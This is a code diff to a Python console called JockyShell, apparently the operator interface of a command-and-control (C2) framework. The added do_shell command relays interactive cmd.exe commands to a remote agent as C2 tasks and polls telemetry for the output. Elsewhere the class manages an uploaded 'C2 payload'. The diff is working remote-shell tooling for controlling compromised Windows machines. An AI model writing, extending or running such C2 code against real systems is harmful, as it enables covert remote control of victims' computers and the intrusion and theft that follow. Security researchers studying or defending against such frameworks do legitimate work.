@@ -331,6 +331,73 @@ class JockyShell(cmd.Cmd):
                     pass
             print(f"[{entry.get('received_at','')}] {entry.get('log_type','')}  {json.dumps(data)}")
 
+    def do_shell(self, arg: str) -> None:
+        "shell --agent <id>  : interactive cmd.exe relay via task + telemetry (latency = poll interval)"
+        if not self._require_c2():
+            return
+
+        parser = _Parser(prog="shell", add_help=False)
+        parser.add_argument("--agent", required=True)
+        try:
+            args = parser.parse_args(shlex.split(arg))
+        except ArgParseExit:
+            return
+
+        short = args.agent[:8]
+        print(f"[*] shell relay → {short}…  (latency ≈ agent poll interval, default 30 s)")
+        print(f"[*] type 'exit' or press Ctrl-C to return to jocky\n")
+
+        while True:
+            try:
+                line = input(f"[{short}]> ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print("\n[*] shell closed")
+                break
+
+            if not line:
+                continue
+            if line.lower() in ("exit", "quit"):
+                print("[*] shell closed")
+                break
+
+            try:
+                result = self.c2_client.create_task(args.agent, "shell", {"cmd": line})
+            except Exception as exc:
+                print(f"[-] task failed: {exc}")
+                continue
+
+            task_id = result.get("task_id", "")
+            if not task_id:
+                print("[-] no task_id returned")
+                continue
+
+            # Poll telemetry until the matching entry arrives (up to 60 s).
+            output = None
+            for _ in range(60):
+                time.sleep(1)
+                try:
+                    logs = self.c2_client.list_telemetry(args.agent, limit=30)
+                    for entry in logs:
+                        if str(entry.get("task_id") or "").lower() != task_id.lower():
+                            continue
+                        raw = entry.get("result_data") or {}
+                        if isinstance(raw, str):
+                            try:
+                                raw = json.loads(raw)
+                            except json.JSONDecodeError:
+                                pass
+                        output = raw.get("output", "") if isinstance(raw, dict) else str(raw)
+                        break
+                except Exception:
+                    pass
+                if output is not None:
+                    break
+
+            if output is None:
+                print("[-] timed out (60 s) — agent may not have picked up the task yet")
+            else:
+                print(output, end="" if output.endswith("\n") else "\n")
+
     def do_payload(self, arg: str) -> None:
         "payload upload --file <path> | payload status : manage the C2 payload"
         if not self._require_c2():
